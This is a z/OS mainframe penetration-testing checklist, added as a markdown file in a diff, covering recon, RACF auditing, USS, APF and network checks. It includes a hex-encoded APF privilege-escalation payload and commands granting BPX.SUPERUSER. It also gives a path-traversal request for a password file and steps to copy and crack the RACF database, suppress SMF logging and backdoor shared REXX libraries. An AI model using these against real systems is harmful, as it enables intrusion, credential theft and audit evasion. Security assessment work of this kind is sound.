@@ -1,0 +1,592 @@
+```
+  ╔═╛                    ╘═╗
+ ┊║  ⊏r@sH ⊏☺urs3 t☺ ℤ╱ʘS  ║┊
+  ╚═╕                    ╒═╝
+ ```
+  
+# ToC
+
+- [Intro](#intro)
+- [Recon](#recon)
+- [RACF](#racf)
+- [System auditing configuration](#system-auditing-configuration)
+- [Userids (individual)](#userids-individual)
+- [Userids (global)](#userids-global)
+- [OMVS/USS](#omvsuss)
+- [OPERCMD profiles](#opercmd-profiles)
+- [Generic system](#generic-system)
+- [Generic network](#generic-network)
+- [TOP10 z/OS vulnerabilities](#top10-zos-vulnerabilities )
+- [Benchmarks & STIGs](#benchmarks--stigs)
+
+## Intro
+
+Bla bla, yada yada, let's get into it ...
+
+## Recon
+
+At this stage the primary goal is to obtain as much information as possible about the system and its configuration.
+
+- Check organoleptically information present on the login screen.
+
+- Check IPL and syslog messages in SDSF:
+
+  TSO: `sdsf`
+  
+  ISPF: `tso sdsf`
+  
+  While in SDSF:
+  
+  SDSF: `log` // show syslog
+  
+  SDSF: `M + PF7` // reach the top of messages with cmd + key combo
+  
+- In the master console run the following commands and collect info:
+
+  `d iplinfo`
+    
+  `d m=cpu`
+    
+  `d prog,reg`
+    
+  `d XCF`
+    
+  `d prog,apf`
+    
+  `d prog,exit`
+    
+  `d smf,o`
+    
+  `d sms,options`
+    
+  `d ios,config`
+    
+  `d xcf,sysplex`
+    
+  `d consoles`
+  
+  `d parmlib`
+  
+  `d JOBS,ALL` // Lists the address space identifiers for all batch jobs and started tasks
+  
+  `d ASCH,ALL` // Lists the address space identifiers for all APPC/MVS transaction programs
+  
+  `d TS,ALL`   // Lists the address space identifiers for all logged-on time-sharing users
+  
+  `d OMVS,ASID=ALL or DISPLAY OMVS,A=ALL` // Lists the address space identifiers for all z/OS UNIX processes
+  
+- In the ISPF investigate the following:
+    
+  All PARMLIB datasets retrived from the "d parmlib" command. The PARMLIB dataset contains control parameters for the whole system (similar function to /etc in other unices). The SVCs, Exits, APF authorisation configuration, Program Properties Tables, functional subsystems etc.
+  
+  ISPF: `=3.4` // navigate to the dataset search screen
+  
+  Investigate the given PARMLIB's contents using (b)rowse command:
+  
+  ISPF: `SYS1.IPLPAR*` // search term for "dsname level" field
+                               
+  Show the contents of any interesting members using the (s)how command and take
+  a note of the IEASYM, NUCLEUS, SYSCAT (master catalog) and PARMLIB values.
+  Press PF9 and and search for the first PARMLIB, e.g.:
+  
+  ISPF: `SYS2.PARMLIB` // search term for "dsname level" field
+  
+  Edit contents of the library using (e)dit command and locate the IEASYM member using (l)ocate command, e.g.:
+  
+  ISPF: `l IEASYM` // command and argument for "Command" field
+  
+  Show contents of the member (e.g. IEASYMTE, as per the value in PARMLIB) using the (s)how command. It will contain definitions (SYMDEFs) of various system symbols. Take a note of these since you'll have to use them later on (e.g. replace the "xx" in the members' names with SYSCLONE symbol).
+  
+  Also, investigate the contents of the following members in PARMLIBs:
+  
+  * CONSOLxx - check what consoles are defined and if commands are enabled
+               https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.ieag300/cfsec.htm
+               https://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.ieag100/iea3g1_The_CONSOLE_statement_of_CONSOLxx.htm
+  * IEASYSxx - contains some useful information about the system.  
+  * IEACMDxx - contains IBM-supplied commands executed during IPL. Commands are exeuted before and outside of JES2's control. Additonally, commands with "sub=mstr" will run in the master subsystem. Perfect place to implant a malicious code.
+               https://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.ieae200/ieacmd.htm
+               https://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.ieab600/runstcm.htm
+  * IEASVCxx - defines custom installation's own SVCs, which can be numbered from 200 through 255.
+  * IEAFIXxx - names of modules that are to be fixed in storage for the duration of an IPL (e.g. add or replace SVC or ERP routines).
+  * IEALPAxx - names of modules to be added as a temporary extension to the Pageable/Modified Link Pack Area (PLPA/MLPA). The data sets in the LPALST can be a mixture of APF-authorized and non-APF-authorized data sets. However, any module in the modified link pack area will be treated by the system as though it came from an APF-authorized library. Ensure that you have properly protected any library that contributes modules to the modified link pack area to avoid system security and integrity exposures, just as you would protect any APF-authorized library.
+               https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.ieae200/iealpa.htm
+  * LPALSTxx - contains libraries which will be used to create Link Pack Area (LPA) during IPL.
+               https://techdocs.broadcom.com/content/broadcom/techdocs/us/en/ca-mainframe-software/security/ca-auditor-for-z-os/12-1/using/technical-information/link-pack-area-analysis.html
+  * PROGxx - contains APF-authorized program library list, modules to be added to, or deleted from, LPA after IPL etc.
+             https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.4.0/com.ibm.zos.v2r4.ieae200/prog.htm
+             
+  Also, investigate members and contents of the following datasets/libraries (many of these datasets are commands on their own which you can run, much like /bin:/sbin:/usr/bin:/user/sbin etc. in unices):
+
+  * SYS1.UADS - if ACP is not used for whatever reason, then definitions in this dataset will be used to grant access to the system.
+  * SYS1.NUCLEUS - contains the basic supervisor ("kernel") modules of z/OS.
+  * SYS1.PROCLIB - contains JCL procedures distributed with z/OS. In practice, there are many other JCL procedure libraries (supplied with various program products) concatenated with it.
+  * SYS1.LINKLIB - contains many of the basic execution modules of the system (z/OS components and utilities). By default, SYS1.LINKLIB is the first data set in the linklist, which is a collection of libraries containing system and user code. In practice, it is one of a large number of execution libraries that are concatenated.
+  * SYS1.LPALIB - contains system execution modules that are loaded into the LPA when the system is initialised. There may be several other libraries concatenated with it. Programs stored here are available to other address spaces.
+  * SYS1.SVCLIB - contains operating system routines / supervisor calls (SVCs).
+  
+- In OMVS/USS session run:
+ 
+  SHELL: `uname -a`
+    
+- Use IODF to check for hardware & I/O configuration if installed:
+
+  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.ieag800/iea3g814.htm
+  
+- General:
+
+  - http://www.longpelaexpertise.com.au/ezine/FindSoftware.php
+ 
+  - Mark Zelden's [IPLINFO Rexx](http://mzelden.com/mvsfiles/iplinfo.txt) can provide a lot of the above data in one place.
+
+## RACF
+
+Testing various RACF aspects.
+
+- Are the RACF recovery scenarios/mechanisms/tools prepared, in place and tested?
+- Check RACF status and datasets location(s):
+
+  TSO: `rvary`
+    
+- List and check RACF currently configured options:
+
+  TSO: `setr list`
+    
+- Check if RACF is synchronized with Active Directory/LDAP etc.
+  Compromising credentials stored/used by these systems can provide you with access to z/OS.
+  Is RACFEVNT class active and NOTIFY.LDAP.USER is defined?
+
+  ftp://public.dhe.ibm.com/s390/zos/racf/pdf/nyrug_2004_04_heterogeneous_password_sync.pdf
+
+  https://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.icha700/pwenv.htm
+
+- Check if PROTECT-ALL is active, also its value should be set to FAIL:
+
+  TSO: `setr list`
+    
+  TSO: `setr protectall(fail)`
+    
+  https://www.stigviewer.com/stig/zos_racf/2015-06-24/finding/V-276
+    
+- Locate copies and unloads of the RACF database:
+
+  - Search for datasets containing "RACF" in their name:
+  
+    ISPF: `=3.4` // navigate to the dataset search screen
+  
+    ISPF: `*.*RACF*.**` // search term for "dsname level" field
+  
+  - Search for volume/other backups, e.g. datasets with BACKUP/BAK/BK in their names:
+  
+    ISPF: `=3.4` // navigate to the dataset search screen
+  
+    ISPF: `*.*BACKUP*.**` // search term for "dsname level" field
+
+- Generate and review RACF reports (e.g. violations, see JCLs for details):
+
+  TSO: `racfrw`
+    
+  TSO: `IRRDBU00`
+    
+  https://www.ibm.com/support/knowledgecenter/SSB27U_6.3.0/com.ibm.zvm.v630.icha8/icha8158.htm
+    
+- Check for WARNING mode set on dataset profiles. If so, it will log an event warning but will allow action anyway:
+    
+  TSO: `sr class(dataset) warning`
+    
+- Check users with SPECIAL, OPERATIONS, AUDITOR, CLAUTH attributes set for both, group-level and system-wide.
+  The OPERATION attribute in 99.9% shouldn't be granted at all.
+
+  TSO: `setr list` //check if SAUDIT and OPERAUDIT attributes are set
+    
+  DSMON: `ICHDSM0`
+    
+  https://www.ibm.com/support/knowledgecenter/SSLTBW_1.13.0/com.ibm.zos.r13.icha800/ichza8c087.htm // Selected User Attribute Report
+    
+- Check PRIVILEGED vs. TRUSTED profiles. Same privs but TRUSTED is fully audited and should be used instead of PRIVILEGED.
+
+  DSMON: `ICHDSM0`
+    
+- Check if AUDIT(ALL(READ)) is set on RACF and any copy of it:
+
+  `TODO`
+    
+- Except UACC of the profile, check access list to the given datasets:
+    
+  `TODO`
+
+## System auditing configuration
+- Obtain and review reports generated by auditing settings:
+
+  `TODO`
+
+- Is the system integrated with external logging/monitoring system such as SIEM?
+- Is RACF configured to verify signed programs (File Integrity Monitoring)?
+
+  https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.2.0/com.ibm.zos.v2r2.icha700/svpsets.htm
+
+- Check global auditing options set
+
+  TSO: `setr list`
+  
+  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.icha800/control.htm
+  
+- Check if you can modify SYSx.PARMLI(SMFPRMxx) member which would allow to control the SMF behaviour and prevent various actions from being recorded in the system. 
+      
+## Userids (individual)
+- Check if you can see the userids in the ISPF command history datasets which can contain passwords:
+
+  ISPF: `=3.4` // navigate to the dataset search screen
+
+  ISP: `USERID.spflogX.list`  // search term for "dsname level" field
+    
+- Check if you can see in the SDSF output of jobs run by other userids:
+
+  SDSF: `log` // show syslog
+  
+  SDSF: `M + PF7` // reach the top of messages with cmd + key combo and browse downwards
+
+- Check userid basic account info:
+
+  TSO: `lu userid`
+    
+## Userids (global)
+- Check if the default credentials are used in the system:
+
+  [TSO-Brute](https://github.com/mainframed/TSO-Brute) + [default_accounts.txt](https://github.com/hacksomeheavymetal/zOS/blob/master/default_accounts.txt)
+  
+- Check if any started tasks run as IBMUSER:
+
+  Master console: `d A,ALL`
+  
+- Check password policy:
+
+  TSO: `setr list`
+  
+  ISPF: `=m.3.5.1`
+
+  [SETRRCVT Rexx](https://github.com/jaytay79/zos/blob/master/SETRRCVT.rexx) // [Running a REXX program from the z/OS shells or from a program](https://www.ibm.com/support/knowledgecenter/en/SSLTBW_2.2.0/com.ibm.zos.v2r2.bpxb600/bpx1rx21.htm)
+  
+  TSO: `setr password(interval(30) minchange(0))`
+  
+  TSO: `setr mixedcase`
+  
+  TSO: `IRRDBU00`  // check USBD_PWD_ASIS field and if userid password is case sensitive
+  
+  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.icha700/maxmin.htm
+  
+  https://www.ibm.com/support/knowledgecenter/SSB27U_6.3.0/com.ibm.zvm.v630.icha3/ubdr.htm
+  
+- Check for userids having access to TSO/OMVS/ISPF:
+ 
+  TSO: `SR CLASS(USER)` // lists all userids on the system 
+
+  TSO: `lu *`  // lists users
+    
+  TSO: `listgrp *` // lists groups
+    
+- Check surrogate userids (sudo-like accounts) present in the system:
+  
+  TSO: `sr class(surrogat)`
+  
+- Check session timeouts, e.g. JWT/SWT/TWT parameters:
+
+  In PARMLIBs check contents of the SMFPRMxx member. See [Recon](#recon) for additional information.
+    
+  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.ieae200/smfparm.htm // TSO/started tasks
+  
+  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.bpxb200/jwtime.htm // OMVS / USS
+  
+- Check who has got ALTER/UPDATE access to the APF authorised libraries:
+
+  - reside in datasets flagged as APF-authorized
+  - ISRDDN
+  - IPLINFO     REXX    Exec
+  - TASID
+  - TSO IPLINFO APF
+    
+  https://github.com/ayoul3/Privesc/blob/master/ELV.APF
+    
+- Check which userids can update SYS1.PARMLIB:
+
+  `TODO`
+  
+- Check if SYS1.UADS contains any entries and validate userids if it does.
+  Check if userids defined in this dataset are marked as PROTECTED in RACF.
+  If an ACP is used for managing security accesses then SYS1.UADS dataset should have set UACC(NONE).
+  Otherwise users can assign special attributes to their userids using this file.
+
+  https://www.stigviewer.com/stig/zos_racf/2015-06-24/finding/V-184
+  
+  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.ikjb400/part3.htm
+  
+  http://mainframed767.tumblr.com/post/81610008641/sys1uads-you-shouldnt-have
+  
+- Is user access recertification set?
+
+  `TODO`
+
+- Are meltdown patches applied? OSPROTECT=SYSTEM or OSPROTECT=1 in IEASYSxx (APAR OA55233). Only works if thee appropriate MCLs areapplied.
+
+## OMVS/USS
+
+Finally something you can recognise! Hack it as usual *nices with some twists.
+
+- If BPX.DAEMON is not defined then assuming other userids identities is possible:
+
+  `TODO`
+
+- Privelege escalation vector: as SPECIAL userid set BPX.SUPERUSER (su root without passwd) for USS:
+  
+  ```
+  PERMIT BPX.SUPERUSER CLASS(FACILITY) ID(USERID) ACCESS(READ)
+  SETROPTS GENERIC(FACILITY) REFRESH
+  ```
+  
+- Check for SUID programs:
+
+  `TODO: find / ...`
+  
+- Check filesystem privs (files/dirs):
+
+  `ls -laR /`
+
+- Check for these sensitive permissions being set on file/dirs:
+
+  - SUPERUSER.FILESYS.CHANGEPERMS
+  - SUPERUSER.FILESYS.CHOWN 
+  - BPX.SUPERUSER // uid(0) for FACILITY
+  - SHARED.IDS
+  - CHOWN.UNRESTRICTED
+  - FILE.GROUPOWNER.SETGID
+  - SUPERUSER.FILESYS.MOUNT
+  - SUPERUSER.FILESYS.QUIESCE
+  - SUPERUSER.FILESYS.PFSCTL
+  - SUPERUSER.FILESYS.VREGISTER
+  - SUPERUSER.IPC.RMID
+  - SUPERUSER.PROCESS.GETPSENT
+  - SUPERUSER.PROCESS.KILL
+  - SUPERUSER.PROCESS.PTRACE
+  - SUPERUSER.SETPRIORITY
+  - SUPERUSER.FILESYS
+  - SUPERUSER.FILESYS.ACLOVERRIDE
+  - RESTRICTED.FILESYS.ACCESS
+
+## OPERCMD profiles
+- Can I ADD my own library to the APF list (e.g. in IEAAPFxx or PROGxx)?
+
+  `SETPROG APF,ADD,DSNAME=PREFIX.FOOBAR.DATA,VOLUME=******`
+  
+- Can I update PARMLIB and wait for the next IPL?
+
+  `TODO`
+   
+- Can I update PARMLIB and dynamically add an APF authorised library? 
+
+  `TODO`
+  
+- Do I have access to MVS.SETPROG.** or even ** in the OPERCMDS class?
+ 
+  `TODO`
+  
+- Run your own library as APF:
+
+  `SETPROG APF,ADD,DSNAME=MYOWNLIB.LOAD,SMS`
+  
+  where MYOWNLIB.LOAD contains the following code:
+
+  ```
+  A START
+  DC X'411000300A6B58F0021CBFFFF154A774000858F0022458FF006C58FF00C896'
+  DC X'80F02617FF07FE'
+  END A 
+  ```
+  
+  https://share.confex.com/share/123/webprogram/Handout/Session15993/So%20you%20think%20no%20one%20can%20hack.pdf
+  
+## Generic system
+- Check programs that are permitted to break out of the sandbox:
+
+  The best (and the hardest) way to do this is by scanning control blocks, these include:
+  - User SVCs (stored in the SYS1.NUCLEUS and LPALIST datasets)
+  - APF and TSO APF authorisations (stored in APF-authorized datasets)
+  - I/O appendages (acquire privs via APF-authorized datasets)
+  - Fucntional subsystems (acquire privs via APF-authorized datasets)
+  - Exits (assembler or REXX language programs which can modify the logic of standard software; stored in APF-authorized or other system datasets).
+  - Programs in Properties Table (programs listed in this table only receive privileges if they reside in APF-authorized libraries).
+  - Other methods to cross address space boundaries:
+
+    SRB scheduling 
+    
+    http://www.ibm.com/support/knowledgecenter/zosbasics/com.ibm.zos.zsecurity/zsecc_060.htm
+    
+    http://www.stuhenderson.com/MVSAUDL.pdf
+    
+- Check for Processing Program Tables (PPTs) in SYSx.PARMLIB(SCHEDxx) members which have "NOPASS" attribute defined. It means that these PPTs can bypass RACF's password protection.
+
+- Check who can run/install APF authorized code?
+  
+  `TODO`
+  
+- Check protections of APF authorised libraries:
+
+  In PARMLIBs check IEAAPFxx and PROGxx datasets. See [Recon](#recon) for additional information.
+  
+  Check programs which are linkedited (in other unices better known as a binding step at compile time) with "AC(1)" attribute. 
+  
+  Check PPT entries executed from the APF library. These do not require "AC(1)" attribute.
+  
+- Check poorly coded SVCs:
+
+  In PARMLIBs check SYS1.NUCLEUS, SYS1.LPALIB, SYS1.LNKLIB, SYS1.SVCLIB. See [Recon](#recon) for additional information.
+
+  Master console: `d PROG,LNKLIST`
+  
+  TSO: `test` // finds SVCs with capability for a normal program to obtain control in supervisor state instead of using APF
+
+  ISPF: `tso test`
+    
+- Check JES2/JES3 spool:
+
+  SDSF: `init`
+    
+- Check syslog in SDSF and/or syslog datasets containing syslog entries, i.e. search for password/alu etc. commands that were issued by others/compromised account.
+    
+- Check if it's possible to use DITTO on catalogs and/or normal datasets:
+
+  `TODO`
+
+- Check if it's possible to modify/update master catalog for regular users: 
+
+  `TODO`
+
+- Check apps for UIDs/GIDs 0, what means they can access anything within USS but not MVS datasets.
+  However, UID=0 can be used to trick others to execute something that will modify RACF/datasets on behalf of an attacker:
+
+  TSO: `sr class(user) uid(0)`
+  
+- Check who can modify IODF datasets:
+
+  http://www.ibm.com/support/knowledgecenter/SSLTBW_2.2.0/com.ibm.zos.v2r2.ieag800/iea3g814.htm
+  
+- Check poor surrogat profiles:
+
+  - ** profile with * READ in ACL
+  - userid.SUBMIT in WARNING mode
+  
+- Check what transactions are available for everyone:
+
+  `TODO`
+  
+- Check contents of (Extended) Common Service Area which may contain special routines easily modifiable by users:
+
+  `TODO`
+  
+- Check if automount options exclude setuid, otherwise datasets prefixed with a userids can be alterted to turn setuid and APF-authorized bits:
+  - Access their file system via Unix and copy a program into their home directory
+  - Exit Unix and wait for the file system dataset to be unmounted
+  - Zap the file system dataset to set the owner of the program to UID 0, turn on the setuid bit, and turn on the APF-authorized bit
+  - Access their file system again via Unix, and now when they execute the program, it runs as UID 0 with APF)
+
+- Request and review sources for the JES, RACF and Operating System Exits:
+    
+  DSMON: `ICHDSM0` // find RACF exits, see JCLs for details
+    
+- Check who can download/upload files using IND$FILE:
+
+  `TODO`
+  
+- Check for legacy products, e.g. "Extracting a password from RACF?" from RACF Discussion List (credits naqvi_aman@HOTMAIL.COM):
+
+  ```
+    >
+    > So that would mean its possible to trigger an authentication
+    > (successfully) to RACF with the password/userid in its encrypted form only.
+    >
+    
+    Netview FTP does extract the encrypted password hash from the RACF
+    database, sends it to the target system, and authenticates the userid there
+    with RACROUTE REQUEST=VERIFY,PASSCHK=YES,PASSWRD=xxx,ENCRYPT=NO.
+    ENCRYPT=NO is the magic that tells RACF not to re-encrypt the hash prior
+    to comparing it with the one in the database.
+    
+    Note that this function no longer works when the password is hashed with
+    KDFAES on the source system.  The restriction is documented in II14765.
+    
+    http://www-01.ibm.com/support/docview.wss?uid=isg1II14765
+  ```
+  
+- Run IEBGENER, put RACF db in SYSUT1, then transfer SYSUT2 contents to your box and run John the Ripper (credits R.Skorupka@bremultibank.com.pl):
+
+  `TODO`
+    
+- Check if there are any NJE/RJE nodes/jobs defined? If so, check security configuration (encryption, passwords etc.):
+
+  `TODO`
+
+- Check if DFDSS can be used to read data dumps:
+
+  `TODO`
+
+- Find CLIST/REXX Libraries that are universally updateable that are not at the bo[om of the list of concatenated datasets find an exec that is lower down in the concatenation that is used by one of the privileged users (Sec Admin, Sysprog etc) copy some code to the universally accessible dataset and add a bit of your own code:
+  
+  `TODO`
+
+- Find library that contains loads of stuff that all the teams use and we have UPDATE access update a member in the dataset and add a bit of code (e.g. exec 'some.dataset(cmd)'):
+
+  `TODO`
+   
+## Generic network
+- Try to access the following file via FTP / HTTP (e.g. directly, path traversal, LFI etc.):
+
+  FTP: `get /usr/lpp/internet/server_root/Admin/webadmin.passwd`
+
+  HTTP: `curl http://host/app/?file=/usr/lpp/internet/server_root/Admin/webadmin.passwd` // just an example
+  
+- Try to exploit Shellshock in a CGI scripts hosted via HTTP.
+
+- Check FTP/HTTP for default credentials and/or brute-force with usual tools such as hydra/medusa/msf etc.
+
+- Download RACF db via FTP/HTTP and crack it with JtR (can convert to a flat file with IRRDBU00):
+
+  http://mainframed767.tumblr.com/post/43072129477/how-to-copy-the-racf-database-off-the-mainframe
+  
+- Check if you can run JCLs via FTP's SITE command:
+
+  https://groups.google.com/forum/#!msg/bit.listserv.ibm-main/thREyEqIn8s/RbKInljcfvYJ
+  
+  https://github.com/mainframed/MainTP
+  
+- Check SNA/APPN applications/networks:
+
+  https://www.net-q.com/ssl/images/Baltimore-Presentation-Aug-15-2006.pdf (TODO: tool to automate actions from slide #49)
+  
+  https://www.sdsusa.com/productdocs/NetQ-whitepaper.pdf
+  
+- Perform a typical network pentest.
+
+## TOP10 z/OS vulnerabilities
+
+1. Excessive Number of User ID’s w/No Password Interval
+  > If the userid is being used for started tasks or surrogate, it should be reviewed and changed to PROTECTED.
+2. Inappropriate Usage of z/OS UNIX Superuser Privilege, UID = 0
+3. Data Set Profiles with UACC Greater than READ
+4. RACF Database is not Adequately Protected
+5. Excessive Access to APF Libraries
+6. General Resource Profiles in WARN Mode
+  > Even if access authority is insufficient, RACF is to issue a warning message and allow access to the resource.
+7. Production Batch Jobs have Excessive Resource Access
+  > Review the SMF data for each production batch ID to determine the access required.
+8. Data Set Profiles with UACC of READ
+9. Improper Use or Lack of UNIXPRIV Profiles
+  > UNIXPRIV class resource rules are designed to give a limited subset of the superuser UID (0) capability.
+10. Started Task IDs are not Defined as PROTECTED IDs
+  > User IDs associated with started tasks should be defined as PROTECTED which will exempt them from revocation due to inactivity or excessive invalid password attempts, as well as being used to sign on to an application.
+
+- https://share.confex.com/share/125/webprogram/Handout/Session17714/S17714%20-%20Top%20Ten%20Security%20Vulnerabilities%20in%20z-OS%20%26%20RACF%20Security.pdf
+
+## Benchmarks & STIGs
+- https://www.stigviewer.com/stigs
+- https://benchmarks.cisecurity.org/community/editors/groups/single/?group=db2
+
+
+source: https://github.com/hacksomeheavymetal/zOS/blob/master/pentesting.md
